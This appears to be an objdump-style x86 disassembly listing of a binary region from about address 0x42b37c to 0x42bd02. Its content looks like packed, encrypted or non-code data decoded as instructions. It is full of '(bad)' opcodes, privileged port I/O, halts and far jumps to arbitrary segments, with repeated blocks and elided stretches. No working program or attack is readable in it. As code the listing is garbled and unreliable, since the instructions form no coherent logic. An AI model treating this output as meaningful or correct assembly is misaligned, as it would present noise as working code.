  42b37c:	and    DWORD PTR [edx+edx*4+0x6986ef71],esp
  42b383:	xor    ecx,DWORD PTR ds:[ecx]
  42b386:	xor    eax,0xe41cbfb1
  42b38b:	inc    esp
  42b38c:	mov    esi,DWORD PTR [esi-0x29]
  42b38f:	and    esi,DWORD PTR [ecx-0x1ea670f9]
  42b395:	and    eax,0xb1f63b67
  42b39a:	mov    ch,0x75
  42b39c:	jecxz  0x42b345
  42b39e:	xor    eax,0x1c16a976
  42b3a3:	cs retf 
  42b3a5:	mov    esi,ebp
  42b3a7:	addr16 dec esp
  42b3a9:	repz enter 0xd16e,0xcf
  42b3ae:	xchg   ebp,eax
  42b3af:	(bad)  
  42b3b0:	test   eax,0x23d141a
  42b3b6:	xchg   ecx,eax
  42b3b7:	inc    edx
  42b3b8:	jno    0x42b39f
  42b3ba:	sbb    BYTE PTR [eax],ah
  42b3bc:	xchg   esp,eax
  42b3bd:	dec    esi
  42b3be:	sub    bh,bh
  42b3c0:	fisubr WORD PTR fs:[eax+ecx*8+0x3c]
  42b3c5:	jns    0x42b38e
  42b3c7:	mov    eax,ds:0x7eb4287d
  42b3cc:	shl    ecx,0xf9
  42b3cf:	mov    ecx,0xe48728d
  42b3d4:	jae    0x42b3a3
  42b3d6:	mov    ebx,0xb14d1b78
  42b3db:	jl     0x42b367
  42b3dd:	loope  0x42b38a
  42b3df:	pop    ebx
  42b3e0:	mov    al,0xa8
  42b3e2:	add    DWORD PTR [ebp+0x1cdfcb2f],0xffffffce
  42b3e9:	jae    0x42b40c
  42b3eb:	push   ds
  42b3ec:	rcl    esi,1
  42b3ee:	mov    al,ds:0xa7304b5d
  42b3f3:	sub    eax,0x13d8c680
  42b3f8:	inc    ebx
  42b3f9:	or     DWORD PTR [esi+0x2e3a8e97],esi
  42b3ff:	push   es
  42b400:	or     DWORD PTR [edi+0x53],eax
  42b403:	xchg   DWORD PTR [ebx+0x436bb509],esp
  42b409:	daa    
  42b40a:	cmp    eax,0x6cda9b16
  42b40f:	add    BYTE PTR es:[eax],al
	...
  42b472:	add    BYTE PTR [eax],al
  42b474:	mov    al,BYTE PTR [ebp+0x20]
  42b477:	out    dx,al
  42b478:	out    dx,eax
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   DWORD PTR [ebx-0x3fec0c35],ebx
  42b485:	into   
  42b486:	add    DWORD PTR [eax],eax
  42b488:	add    al,0x1
  42b48a:	add    BYTE PTR [eax],al
  42b48c:	mov    cl,0x14
  42b48e:	dec    ecx
  42b48f:	cld    
  42b490:	inc    edx
  42b491:	sbb    ecx,eax
  42b493:	push   esp
  42b494:	and    DWORD PTR [ecx-0x7b],ecx
  42b497:	xlat   BYTE PTR ds:[ebx]
  42b498:	outs   dx,BYTE PTR ds:[esi]
  42b499:	or     ah,ch
  42b49b:	push   edi
  42b49c:	dec    ebx
  42b49d:	cli    
  42b49e:	cli    
  42b49f:	mov    fs,WORD PTR [esi+0x625cca99]
  42b4a5:	cmp    bh,0x24
  42b4a8:	stc    
  42b4a9:	or     DWORD PTR [ebp-0x41],0xfffffff1
  42b4ad:	push   cs
  42b4ae:	or     eax,edi
  42b4b0:	xlat   BYTE PTR ds:[ebx]
  42b4b1:	loop   0x42b4d7
  42b4b3:	sbb    al,BYTE PTR [ebx+0x21]
  42b4b6:	es or  al,0xd2
  42b4b9:	fcmove st,st(4)
  42b4bb:	xor    ebp,eax
  42b4bd:	inc    edi
  42b4be:	ss fwait
  42b4c0:	test   BYTE PTR [eax+0x76afe686],cl
  42b4c6:	and    BYTE PTR ds:0xa2bfaffb,dh
  42b4cc:	aas    
  42b4cd:	call   0x7a37:0x4be3eb4a
  42b4d4:	mov    bl,0x7c
  42b4d6:	push   esi
  42b4d7:	jl     0x42b543
  42b4d9:	xchg   esi,eax
  42b4da:	adc    edi,DWORD PTR [ecx]
  42b4dc:	mov    DWORD PTR [edi-0x3e],eax
  42b4df:	pop    ebp
  42b4e0:	stos   DWORD PTR es:[edi],eax
  42b4e1:	sbb    edi,0xffffffae
  42b4e4:	pop    ss
  42b4e5:	dec    BYTE PTR [ebx-0x57]
  42b4e8:	pop    edx
  42b4e9:	adc    eax,0x707357bc
  42b4ee:	mov    ah,0x7a
  42b4f0:	outs   dx,DWORD PTR ds:[esi]
  42b4f1:	pop    ebp
  42b4f2:	add    BYTE PTR [ecx-0x79a0b248],dh
  42b4f8:	or     al,0x9e
  42b4fa:	push   0xffffffd2
  42b4fc:	imul   edx,DWORD PTR [ebp-0x37],0x67
  42b500:	sub    bl,BYTE PTR [ecx]
  42b502:	(bad)  
  42b503:	jmp    0x8a3dc917
  42b508:	aam    0xdc
  42b50a:	and    BYTE PTR [ecx],bh
  42b50c:	loop   0x42b543
  42b50e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b50f:	pusha  
  42b510:	xor    al,0x97
  42b512:	(bad)  
  42b513:	jmp    ebx
  42b515:	inc    edi
  42b516:	or     eax,0xa3d8fcbc
  42b51b:	aad    0x3d
  42b51d:	xchg   ebp,eax
  42b51e:	repnz xlat BYTE PTR ds:[ebx]
  42b520:	rcl    ebx,0x45
  42b523:	outs   dx,BYTE PTR ds:[esi]
  42b524:	push   ss
  42b525:	out    dx,al
  42b526:	jmp    0xce95fa6c
  42b52b:	push   esi
  42b52c:	push   eax
  42b52d:	pushf  
  42b52e:	xor    ah,dl
  42b530:	les    ebp,FWORD PTR [eax+0x19]
  42b533:	or     DWORD PTR [ecx+0x1e],0x39db6e9a
  42b53a:	jo     0x42b50b
  42b53c:	mov    ebx,0x219d255f
  42b541:	and    ebx,eax
  42b543:	fs xchg edi,eax
  42b545:	cwde   
  42b546:	pushf  
  42b547:	dec    edi
  42b548:	xor    esp,0x900b2501
  42b54e:	jg     0x42b504
  42b550:	leave  
  42b551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b552:	jae    0x42b5bf
  42b554:	mov    al,ds:0xa586b873
  42b559:	lea    ecx,[ebx+ebp*1]
  42b55c:	not    BYTE PTR [eax+0x66bd3638]
  42b562:	fwait
  42b563:	icebp  
  42b564:	scas   eax,DWORD PTR es:[edi]
  42b565:	les    ebp,FWORD PTR [ebx+0x641d05c6]
  42b56b:	mov    edi,0xd36738d5
  42b570:	jae    0x42b571
  42b572:	mov    ch,al
  42b574:	jecxz  0x42b565
  42b576:	add    ch,BYTE PTR [eax+0x395e5623]
  42b57c:	loopne 0x42b5bb
  42b57e:	std    
  42b57f:	mov    ds:0x631627a8,al
  42b584:	push   cs
  42b585:	stc    
  42b586:	leave  
  42b587:	push   ds
  42b588:	xor    al,0xc5
  42b58a:	js     0x42b552
  42b58c:	inc    eax
  42b58d:	and    al,0x52
  42b58f:	xchg   esp,eax
	...
  42b5f4:	loopne 0x42b58a
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	xchg   esp,eax
  42b601:	adc    al,0x4
  42b603:	pop    es
  42b604:	(bad)  
  42b605:	iret   
  42b606:	add    DWORD PTR [eax],eax
  42b608:	add    al,0x1
  42b60a:	add    BYTE PTR [eax],al
  42b60c:	or     BYTE PTR ds:0x9e66d423,dh
  42b612:	xor    ebx,edi
  42b614:	frstor [ebp+0x12]
  42b617:	fwait
  42b618:	imul   DWORD PTR [edx+0x72458a85]
  42b61e:	jp     0x42b62a
  42b620:	or     al,0xe7
  42b622:	test   DWORD PTR [ecx+0x66],esi
  42b625:	bound  ebx,QWORD PTR [ecx]
  42b627:	mov    DWORD PTR [ebx+0x36],esi
  42b62a:	mul    DWORD PTR [eax-0x436b14d2]
  42b630:	push   0xb
  42b632:	dec    DWORD PTR [esp+edx*1+0x7e639578]
  42b639:	jae    0x42b680
  42b63b:	(bad)  
  42b63c:	je     0x42b647
  42b63e:	setne  BYTE PTR [eax+edx*2+0x78f0420]
  42b646:	in     eax,dx
  42b647:	jb     0x42b5f1
  42b649:	addr16 mov edi,0x6f7952da
  42b64f:	pop    es
  42b650:	or     eax,0xbc0f2789
  42b655:	and    bh,BYTE PTR [ecx+edx*4-0x38a54f7d]
  42b65c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b65d:	pop    esp
  42b65e:	in     eax,0xc0
  42b660:	es js  0x42b673
  42b663:	outs   dx,BYTE PTR ds:[esi]
  42b664:	add    esp,edi
  42b666:	push   ss
  42b667:	repz ss push eax
  42b66a:	gs std 
  42b66c:	jp     0x42b666
  42b66e:	cmp    dh,BYTE PTR [ebx+0x4e5e2db9]
  42b674:	iret   
  42b675:	(bad)  
  42b676:	sbb    BYTE PTR [ecx+esi*8],dl
  42b679:	mov    esi,0x9d5d7310
  42b67e:	hlt    
  42b67f:	jg     0x42b685
  42b681:	adc    eax,0x1fc09136
  42b686:	sbb    al,ah
  42b688:	cmp    al,BYTE PTR [edi-0x78]
  42b68b:	jbe    0x42b6d3
  42b68d:	sbb    BYTE PTR [eax],dl
  42b68f:	repz pop edi
  42b691:	dec    edx
  42b692:	cmc    
  42b693:	mov    al,0xfa
  42b695:	or     eax,DWORD PTR [ecx-0x25]
  42b698:	xchg   edi,eax
  42b699:	mov    ebx,0x9e75ae36
  42b69e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b69f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b6a0:	sbb    BYTE PTR [edi],cl
  42b6a2:	or     DWORD PTR [esi],eax
  42b6a4:	jno    0x42b685
  42b6a6:	cdq    
  42b6a7:	xor    DWORD PTR [esi+0x50],ecx
  42b6aa:	xchg   edx,eax
  42b6ab:	sub    ebx,edx
  42b6ad:	jecxz  0x42b6f3
  42b6af:	pop    eax
  42b6b0:	out    0xe0,eax
  42b6b2:	or     dh,BYTE PTR [ecx+0x5]
  42b6b5:	rcl    DWORD PTR [edx-0x14],cl
  42b6b8:	mov    ebx,0x2abfbe64
  42b6bd:	adc    al,0x6e
  42b6bf:	dec    ebp
  42b6c0:	xor    esi,esi
  42b6c2:	mov    eax,ds:0x599e642c
  42b6c7:	inc    edi
  42b6c8:	add    eax,0xf7319ea2
  42b6cd:	xchg   esi,eax
  42b6ce:	jo     0x42b6e7
  42b6d0:	push   ds
  42b6d1:	outs   dx,DWORD PTR ds:[esi]
  42b6d2:	dec    ebx
  42b6d3:	jae    0x42b725
  42b6d5:	xchg   esp,eax
  42b6d6:	mov    esi,0xd3c6dbba
  42b6db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b6dc:	push   esp
  42b6dd:	ds pop es
  42b6df:	ret    0x26de
  42b6e2:	mov    ebp,0x84e3d39b
  42b6e7:	ror    DWORD PTR [eax+0x2dc38150],0xad
  42b6ee:	jns    0x42b706
  42b6f0:	fiadd  WORD PTR [edi+0x71a6383a]
  42b6f6:	fincstp 
  42b6f8:	push   ss
  42b6f9:	popf   
  42b6fa:	dec    edx
  42b6fb:	les    ecx,FWORD PTR [ecx+esi*4+0x44]
  42b6ff:	mov    dl,0x8c
  42b701:	repz aad 0x2d
  42b704:	enter  0x4a7d,0x86
  42b708:	and    eax,0xf0b50a28
  42b70d:	and    ecx,edi
  42b70f:	dec    edx
	...
  42b774:	dec    esi
  42b775:	inc    edx
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	pop    edx
  42b781:	and    ecx,ebp
  42b783:	mov    edi,0x1d0c8
  42b788:	add    al,0x1
  42b78a:	add    BYTE PTR [eax],al
  42b78c:	jmp    0xad52bb65
  42b791:	call   0x98f237ad
  42b796:	loop   0x42b722
  42b798:	jns    0x42b729
  42b79a:	dec    edi
  42b79b:	bsr    ebx,eax
  42b79e:	jae    0x42b730
  42b7a0:	std    
  42b7a1:	inc    esp
  42b7a2:	pop    eax
  42b7a3:	mov    BYTE PTR [ebp+eiz*1-0x7f],0xef
  42b7a8:	cmp    dl,bh
  42b7aa:	xchg   ecx,eax
  42b7ab:	bound  esi,QWORD PTR [edx+0x2d]
  42b7ae:	and    BYTE PTR [edi+0x0],bh
  42b7b1:	(bad)  
  42b7b2:	js     0x42b74d
  42b7b4:	pushf  
  42b7b5:	aas    
  42b7b6:	out    dx,eax
  42b7b7:	xor    al,0x9f
  42b7b9:	test   BYTE PTR ds:0x4290b3ae,dl
  42b7bf:	stos   BYTE PTR es:[edi],al
  42b7c0:	fcmove st,st(3)
  42b7c2:	out    dx,eax
  42b7c3:	xor    BYTE PTR [edi+0x1eafcfdb],ah
  42b7c9:	jecxz  0x42b7a6
  42b7cb:	(bad)  
  42b7cd:	popa   
  42b7ce:	mov    cl,0xed
  42b7d0:	jae    0x42b813
  42b7d2:	push   edi
  42b7d3:	or     eax,DWORD PTR [ebx-0x2]
  42b7d6:	xchg   ebp,esi
  42b7d8:	cmp    al,0x4f
  42b7da:	arpl   WORD PTR [esi*1+0x5f0bbe50],bx
  42b7e1:	sbb    bl,dh
  42b7e3:	(bad)  
  42b7e4:	jae    0x42b7ef
  42b7e6:	cld    
  42b7e7:	push   ebp
  42b7e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b7e9:	adc    al,0x6b
  42b7eb:	stos   BYTE PTR es:[edi],al
  42b7ec:	outs   dx,BYTE PTR ds:[esi]
  42b7ed:	jns    0x42b7bb
  42b7ef:	lahf   
  42b7f0:	adc    DWORD PTR [esi+0x50],edx
  42b7f3:	cmp    BYTE PTR [edx+0x6623ccd7],ch
  42b7f9:	pop    edx
  42b7fa:	xchg   DWORD PTR [ecx+ebp*2],esp
  42b7fd:	stc    
  42b7fe:	inc    esp
  42b7ff:	leave  
  42b800:	fisttp WORD PTR ds:0xe5c972e6
  42b806:	sbb    dl,BYTE PTR gs:[esi+0x2f386c0b]
  42b80d:	and    eax,0xa17ee7a6
  42b812:	adc    BYTE PTR [ebx+0x2],0x1b
  42b816:	dec    cx
  42b818:	mov    ebx,0xb9301bda
  42b81d:	mov    edx,DWORD PTR [edx]
  42b81f:	sub    al,0xf3
  42b821:	jmp    0xe682:0x49cbee18
  42b828:	dec    DWORD PTR [eax+0xd]
  42b82b:	adc    eax,0xa273bfdb
  42b830:	cdq    
  42b831:	sar    DWORD PTR [ecx],0x46
  42b834:	add    eax,0xc0f72e48
  42b839:	inc    BYTE PTR [esi+0x5cdb9be4]
  42b83f:	pushf  
  42b840:	fstp   st(4)
  42b842:	mov    ?,WORD PTR [edi-0x5549ae89]
  42b848:	les    ebp,FWORD PTR [esi+esi*1]
  42b84b:	ins    DWORD PTR es:[edi],dx
  42b84c:	jns    0x42b8a6
  42b84e:	xor    al,0x2e
  42b850:	xchg   edx,eax
  42b851:	shr    BYTE PTR [eax+0x260d1c4e],cl
  42b857:	cmp    eax,0x72e9de36
  42b85c:	imul   edi,DWORD PTR [ebp+0x3a784241],0xd2d4b21c
  42b866:	adc    esp,DWORD PTR [ebx]
  42b868:	rcl    DWORD PTR [eax],cl
  42b86a:	pushf  
  42b86b:	cmp    ecx,ebx
  42b86d:	mov    ds:0x9896b03c,al
  42b872:	add    edx,DWORD PTR [ebp-0x35]
  42b875:	ja     0x42b893
  42b877:	(bad)  
  42b878:	pushf  
  42b879:	or     DWORD PTR [ebx+eax*8+0x73],0x74ef7fbc
  42b881:	inc    edi
  42b882:	xor    eax,0x18a7c388
  42b887:	or     DWORD PTR [edi-0x7a],edx
  42b88a:	retf   
  42b88b:	ins    DWORD PTR es:[edi],dx
  42b88c:	jp     0x42b8fd
  42b88e:	pop    esi
  42b88f:	xor    al,0x0
	...
  42b8f1:	add    BYTE PTR [eax],al
  42b8f3:	add    al,ch
  42b8f5:	popf   
  42b8f6:	mov    esi,0xf9e7ffe7
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     esi,DWORD PTR [ebp+0x66]
  42b902:	int3   
  42b903:	loop   0x42b8d1
  42b905:	rol    DWORD PTR [ecx],1
  42b907:	add    BYTE PTR [ecx+eax*1],al
  42b90a:	add    BYTE PTR [eax],al
  42b90c:	outs   dx,DWORD PTR ds:[esi]
  42b90d:	(bad)  
  42b90e:	(bad)  
  42b90f:	test   eax,0xbc9bd9ff
  42b914:	daa    
  42b915:	mov    esi,0x237bdc10
  42b91a:	pop    edx
  42b91b:	jp     0x42b8c4
  42b91d:	mov    edi,0x5444b314
  42b922:	pop    esp
  42b923:	jae    0x42b98a
  42b925:	jp     0x42b92e
  42b927:	mov    WORD PTR [ebx],ss
  42b929:	adc    DWORD PTR [esi+0x7331ee2],ebp
  42b92f:	in     eax,dx
  42b930:	pop    ebp
  42b931:	shl    DWORD PTR [edi-0x221b600c],0xd4
  42b938:	aas    
  42b939:	ja     0x42b9b3
  42b93b:	xlat   BYTE PTR ds:[ebx]
  42b93c:	imul   esi,DWORD PTR [ebp+0xa],0xfffffffe
  42b940:	sub    eax,0xdc9d9e94
  42b945:	mov    ecx,DWORD PTR [bx+di-0x7888]
  42b94a:	xchg   edx,eax
  42b94b:	or     BYTE PTR [ebx+0x4d],cl
  42b94e:	jo     0x42b9a4
  42b950:	arpl   WORD PTR [esi],di
  42b952:	ins    DWORD PTR es:[edi],dx
  42b953:	int3   
  42b954:	push   0x2b
  42b956:	data16 das 
  42b958:	aaa    
  42b959:	je     0x42b9bf
  42b95b:	out    dx,eax
  42b95c:	mov    esi,0x2721c7ac
  42b961:	(bad)  
  42b962:	int    0xf1
  42b964:	call   0x92ab:0x3746a740
  42b96b:	inc    ecx
  42b96c:	test   al,0xab
  42b96e:	adc    bl,BYTE PTR [eax-0x17]
  42b971:	aas    
  42b972:	push   esp
  42b973:	jae    0x42b9e1
  42b975:	xchg   esi,eax
  42b976:	inc    ax
  42b978:	clc    
  42b979:	out    0xda,al
  42b97b:	sti    
  42b97c:	shl    BYTE PTR [edx],0x5
  42b97f:	jecxz  0x42b91c
  42b981:	(bad)  
  42b982:	in     al,0x23
  42b984:	cmp    eax,0x586f45a1
  42b989:	cmp    DWORD PTR [ebp+0xb4e2ad3],edx
  42b98f:	imul   ecx,DWORD PTR [ecx-0x18],0xffffffa4
  42b993:	cmp    DWORD PTR [ebx-0x40],ebx
  42b996:	push   ss
  42b997:	add    bh,BYTE PTR [ebp-0x42529b30]
  42b99d:	or     ah,cl
  42b99f:	gs sub esp,ebx
  42b9a2:	xor    al,0x81
  42b9a4:	jo     0x42b9f5
  42b9a6:	xchg   esp,eax
  42b9a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b9a8:	mov    bl,0x58
  42b9aa:	dec    esi
  42b9ab:	mov    ds:0x82a877e2,al
  42b9b0:	inc    edx
  42b9b1:	push   cs
  42b9b2:	mov    DWORD PTR [ecx-0xdecee52],ecx
  42b9b8:	jnp    0x42b9f8
  42b9ba:	jmp    0x42b9f2
  42b9bc:	into   
  42b9bd:	int3   
  42b9be:	test   BYTE PTR [esi+0x31],ch
  42b9c1:	push   edi
  42b9c2:	lds    edx,FWORD PTR [eax]
  42b9c4:	cmc    
  42b9c5:	pop    es
  42b9c6:	call   0xcf20:0x68ac1013
  42b9cd:	xlat   BYTE PTR ds:[ebx]
  42b9ce:	sbb    al,bl
  42b9d0:	cmp    esi,eax
  42b9d2:	jmp    0x4900dda4
  42b9d7:	pop    ss
  42b9d8:	pop    eax
  42b9d9:	icebp  
  42b9da:	dec    eax
  42b9db:	(bad)  
  42b9dd:	xor    ebp,ecx
  42b9df:	lds    edi,FWORD PTR [ebx-0x34f3baba]
  42b9e5:	and    dl,BYTE PTR ds:0xd7d1d4db
  42b9eb:	outs   dx,DWORD PTR ds:[esi]
  42b9ec:	pop    ebp
  42b9ed:	inc    eax
  42b9ee:	xchg   edx,eax
  42b9ef:	leave  
  42b9f0:	adc    dh,BYTE PTR [eax]
  42b9f2:	push   esi
  42b9f3:	lds    ecx,FWORD PTR [edi]
  42b9f5:	add    al,BYTE PTR [ebp+0x70]
  42b9f8:	and    esp,DWORD PTR ds:0xbd529fca
  42b9fe:	push   edx
  42b9ff:	(bad)  
  42ba00:	ins    BYTE PTR es:[edi],dx
  42ba01:	mov    ch,BYTE PTR [edx+ebx*1+0x73]
  42ba05:	adc    al,0xfa
  42ba07:	nop
  42ba08:	test   eax,0x5150a7e3
  42ba0d:	mov    BYTE PTR [ecx+0x54],bl
	...
  42ba73:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba79:	neg    ebx
  42ba7b:	outs   dx,DWORD PTR ds:[esi]
  42ba7c:	push   0x5b
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [edi-0x2f8f5a0b],edx
  42ba85:	rol    BYTE PTR [ecx],cl
  42ba87:	add    BYTE PTR [ecx+eax*1],al
  42ba8a:	add    BYTE PTR [eax],al
  42ba8c:	jmp    0x42bab4
  42ba8e:	xor    BYTE PTR [ebx],0xce
  42ba91:	xchg   esp,eax
  42ba92:	outs   dx,DWORD PTR ds:[esi]
  42ba93:	inc    edx
  42ba94:	repnz adc ch,BYTE PTR [ebx+ebp*8-0x46bf8597]
  42ba9c:	push   0x32aca9f8
  42baa1:	pop    esp
  42baa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42baa3:	mov    ah,0xc8
  42baa5:	add    ebx,DWORD PTR [edi-0x4b0a7fc]
  42baab:	(bad)  
  42baac:	enter  0x7f88,0x92
  42bab0:	aas    
  42bab1:	mov    DWORD PTR [esi],0xab58817
  42bab7:	mov    esp,0x35a7894
  42babc:	bnd js 0x42bad4
  42babf:	les    edi,FWORD PTR [edi-0x7e]
  42bac2:	jle    0x42ba4b
  42bac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bac5:	inc    ebx
  42bac6:	cmp    BYTE PTR [ecx+0x79],bh
  42bac9:	mov    ebp,cs
  42bacb:	push   es
  42bacc:	imul   esi,DWORD PTR [edi],0x72
  42bacf:	out    dx,eax
  42bad0:	cmp    al,0x7b
  42bad2:	mov    al,ss:0xa94734f8
  42bad8:	inc    edi
  42bad9:	lock cli 
  42badb:	cmp    DWORD PTR cs:[edi+ebx*8-0xa],0x8e2e696c
  42bae4:	scas   al,BYTE PTR es:[edi]
  42bae5:	bound  edx,QWORD PTR [edi]
  42bae7:	shl    cl,1
  42bae9:	jp     0x42bb30
  42baeb:	mov    ds:0x7158fd55,al
  42baf0:	loop   0x42baf5
  42baf2:	cld    
  42baf3:	retf   
  42baf4:	(bad)  
  42baf6:	mov    esp,0xc6a8809b
  42bafb:	or     eax,0x484ae6ca
  42bb00:	adc    eax,0xea750f4b
  42bb05:	fcmovu st,st(3)
  42bb07:	rcr    BYTE PTR [eax+0xee24f07],0x9c
  42bb0e:	xchg   ebx,eax
  42bb0f:	inc    eax
  42bb10:	or     bl,BYTE PTR [ebp-0x1e]
  42bb13:	stc    
  42bb14:	jmp    0x42bace
  42bb16:	xchg   edi,eax
  42bb17:	pop    eax
  42bb18:	cli    
  42bb19:	je     0x42bb66
  42bb1b:	mov    dh,0xdb
  42bb1d:	hlt    
  42bb1e:	xchg   DWORD PTR ds:0x6597505,edi
  42bb24:	hlt    
  42bb25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bb26:	xor    eax,0xc203403d
  42bb2b:	xchg   bl,bl
  42bb2d:	inc    esp
  42bb2e:	test   al,0x3d
  42bb30:	adc    al,0xe5
  42bb32:	jne    0x42bb04
  42bb34:	mov    al,0xed
  42bb36:	(bad)  
  42bb37:	mov    ds:0x78ac4fe6,eax
  42bb3c:	jns    0x42bb48
  42bb3e:	in     al,dx
  42bb3f:	xlat   BYTE PTR ds:[ebx]
  42bb40:	pop    esp
  42bb41:	popa   
  42bb42:	mov    WORD PTR [esi+0x14b80765],ds
  42bb48:	mov    cl,0x72
  42bb4a:	repnz outs dx,DWORD PTR ds:[esi]
  42bb4c:	jmp    0xf7e3f3ec
  42bb51:	adc    ebx,DWORD PTR [edi-0x4c]
  42bb54:	mov    ecx,fs
  42bb56:	inc    esp
  42bb57:	mov    ebp,0xcce61d25
  42bb5c:	mov    al,es:0x3a72b96b
  42bb62:	adc    ebx,DWORD PTR [edi-0x7decb23]
  42bb68:	fstp   QWORD PTR [ecx-0x35]
  42bb6b:	ret    
  42bb6c:	fisttp QWORD PTR [eax-0xa]
  42bb6f:	sub    DWORD PTR [ebx],edi
  42bb71:	shl    eax,1
  42bb73:	out    0x7c,eax
  42bb75:	jae    0x42bb18
  42bb77:	lods   eax,DWORD PTR ds:[esi]
  42bb78:	mov    cl,0x3
  42bb7a:	nop
  42bb7b:	and    BYTE PTR cs:0xbeb860d1,cl
  42bb82:	int    0x6b
  42bb84:	gs fcmove st,st(5)
  42bb87:	je     0x42bbb2
  42bb89:	scas   al,BYTE PTR es:[edi]
  42bb8a:	adc    edx,DWORD PTR [edx]
  42bb8c:	in     eax,0x6d
  42bb8e:	fld    QWORD PTR es:[eax]
	...
  42bbf1:	add    BYTE PTR [eax],al
  42bbf3:	add    BYTE PTR [eax+ebp*1],dh
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	or     BYTE PTR [ebx],ah
  42bc02:	sbb    al,0x78
  42bc04:	aam    0xd3
  42bc06:	add    DWORD PTR [eax],eax
  42bc08:	add    al,0x1
  42bc0a:	add    BYTE PTR [eax],al
  42bc0c:	jb     0x42bbbe
  42bc0e:	dec    ecx
  42bc0f:	push   cs
  42bc10:	or     al,0x32
  42bc12:	stos   DWORD PTR es:[edi],eax
  42bc13:	jnp    0x42bc02
  42bc15:	mov    ecx,0x14314b32
  42bc1a:	add    BYTE PTR [esi],0x3f
  42bc1d:	jg     0x42bbf6
  42bc1f:	call   0x924f8d73
  42bc24:	outs   dx,BYTE PTR ds:[esi]
  42bc25:	pop    eax
  42bc26:	in     al,dx
  42bc27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bc28:	adc    eax,DWORD PTR [ebp-0x1d3ceded]
  42bc2e:	inc    DWORD PTR [ebx+0x67]
  42bc31:	(bad)  
  42bc32:	sub    edx,DWORD PTR [edx-0x6ef5b225]
  42bc38:	sub    al,BYTE PTR [edx+esi*2-0x71]
  42bc3c:	mov    edi,0xa5257e15
  42bc41:	sub    edx,DWORD PTR [edx+0x4]
  42bc44:	sti    
  42bc45:	repz fwait
  42bc47:	mov    bl,0x71
  42bc49:	out    0x45,eax
  42bc4b:	mov    al,0x83
  42bc4d:	sub    al,0xd9
  42bc4f:	cwde   
  42bc50:	mov    ah,0xf9
  42bc52:	bndstx [edx+edx*1+0x3b],(bad)
  42bc57:	dec    edi
  42bc58:	hlt    
  42bc59:	xchg   esi,eax
  42bc5a:	hlt    
  42bc5b:	adc    al,0xd7
  42bc5d:	aas    
  42bc5e:	dec    edi
  42bc5f:	lds    edi,FWORD PTR [esi]
  42bc61:	pop    ebp
  42bc62:	xchg   edi,eax
  42bc63:	(bad)  
  42bc64:	xlat   BYTE PTR ds:[ebx]
  42bc65:	xchg   ecx,eax
  42bc66:	lock sar cl,0x99
  42bc6a:	sub    ebp,esp
  42bc6c:	push   es
  42bc6d:	cdq    
  42bc6e:	jno    0x42bc61
  42bc70:	clc    
  42bc71:	(bad)  
  42bc72:	fldenv ds:0xb812bbfd
  42bc78:	sbb    cl,BYTE PTR [eax]
  42bc7a:	ins    DWORD PTR es:[edi],dx
  42bc7b:	test   BYTE PTR [ebp+0x1d],dl
  42bc7e:	jecxz  0x42bcf1
  42bc80:	retf   
  42bc81:	mov    ah,0xce
  42bc83:	dec    edi
  42bc84:	add    bl,dl
  42bc86:	cwde   
  42bc87:	ja     0x42bc1f
  42bc89:	je     0x42bc13
  42bc8b:	sub    esp,DWORD PTR [edx-0x30519a14]
  42bc91:	jp     0x42bc15
  42bc93:	cmp    ah,ch
  42bc95:	pusha  
  42bc96:	icebp  
  42bc97:	bound  eax,QWORD PTR [eax-0x3f]
  42bc9a:	(bad)  
  42bc9b:	or     esp,esp
  42bc9d:	mov    dl,0x7f
  42bc9f:	or     DWORD PTR [edx],ebx
  42bca1:	and    al,0x2
  42bca3:	jmp    0x42bc5f
  42bca5:	or     cl,0x34
  42bca8:	or     al,0xb
  42bcaa:	mov    ch,0x9a
  42bcac:	outs   dx,DWORD PTR es:[esi]
  42bcae:	(bad)  
  42bcaf:	call   0x4d26:0xeda1d903
  42bcb6:	dec    ebx
  42bcb7:	dec    esi
  42bcb8:	push   edi
  42bcb9:	js     0x42bc52
  42bcbb:	cs repnz pop edx
  42bcbe:	and    eax,0xc9d59d61
  42bcc3:	push   0x2d
  42bcc5:	mov    eax,0x9e82dc5b
  42bcca:	std    
  42bccb:	je     0x42bd12
  42bccd:	mov    ds:0xd1b63d27,al
  42bcd2:	or     eax,0xcef1b3d8
  42bcd7:	add    esi,DWORD PTR [edi+0x52]
  42bcda:	sbb    cl,dl
  42bcdc:	data16 and bh,BYTE PTR [ebp+0x3c]
  42bce0:	mov    esp,0x1c21d860
  42bce5:	xchg   ebx,eax
  42bce6:	cmp    eax,0x309d7566
  42bceb:	xchg   esp,eax
  42bcec:	shl    dl,0xd9
  42bcef:	mov    al,0x1f
  42bcf1:	mov    al,0xa0
  42bcf3:	pushf  
  42bcf4:	pop    esi
  42bcf5:	dec    edx
  42bcf6:	es sbb dh,bh
  42bcf9:	(bad)  
  42bcfa:	mov    esp,0xac82d871
  42bcff:	shl    BYTE PTR [edx+0x4a],cl
  42bd02:	(bad)  
